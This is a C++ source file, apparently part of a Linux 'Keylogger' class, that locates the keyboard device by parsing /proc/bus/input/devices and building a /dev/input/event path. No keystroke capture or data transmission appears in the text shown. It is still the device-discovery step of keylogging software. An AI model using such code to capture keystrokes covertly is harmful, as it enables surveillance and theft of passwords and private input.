#include "api/keylogger.hpp"

#include <algorithm>
#include <optional>

#include <fstream>
static std::optional<std::string> parse_event_name(const std::string& handle_line);
static void parse_device_block(std::istream& in, std::string& out_name, std::string &out_handler);



bool Keylogger::find_keyboard_() {
    // Open /proc/bus/input/devices to find keyboard device
    std::ifstream in("/proc/bus/input/devices");
    if (!in.is_open()) {
        last_error_ = "Failed to open /proc/bus/input/devices";
        return false;
    }

    // Parse the file to find keyboard device
    while (in) {

        // Read a device block
        std::string name, handlers;
        parse_device_block(in, name, handlers);
        if (name.empty()) continue;

        // Check if it's a keyboard
        std::string lower_name = name;
        std::transform(lower_name.begin(), lower_name.end(), lower_name.begin(), ::tolower);
        if (lower_name.find("keyboard") == std::string::npos) continue;
        
        // Extract event name from handlers
        auto event_name_opt = parse_event_name(handlers);
        if (event_name_opt) {
            device_path_ = "/dev/input/" + *event_name_opt;
            return true;
        }
    }
    
    last_error_ = "No keyboard device found";
    return false;
}


// Helper function to extract event name from handler line
static std::optional<std::string> parse_event_name(const std::string& handle_line) {
    if (handle_line.find("kbd") == std::string::npos) 
        return std::nullopt;

    size_t pos = handle_line.find("event");
    if (pos == std::string::npos)
        return std::nullopt;
    
    size_t end = handle_line.find(' ', pos);
    std::string event_name = handle_line.substr(pos, end - pos);
    return event_name;
}


// Helper function to parse a device block from /proc/bus/input/devices
static void parse_device_block(std::istream& in, std::string& out_name, std::string &out_handler) {
    out_name.clear();
    out_handler.clear();
    std::string line;

    while (std::getline(in, line)) {
        if (line.empty()) 
            break;

        if (line.rfind("N: Name=", 0) == 0) {
            size_t start = line.find('"');
            size_t end = line.rfind('"');
            if (start != std::string::npos && end != std::string::npos && end > start) {
                out_name = line.substr(start + 1, end - start - 1);
            }
        } else if (line.rfind("H: Handlers=", 0) == 0) {
            out_handler = line.substr(12); // Length of "H: Handlers="
        }
    }
}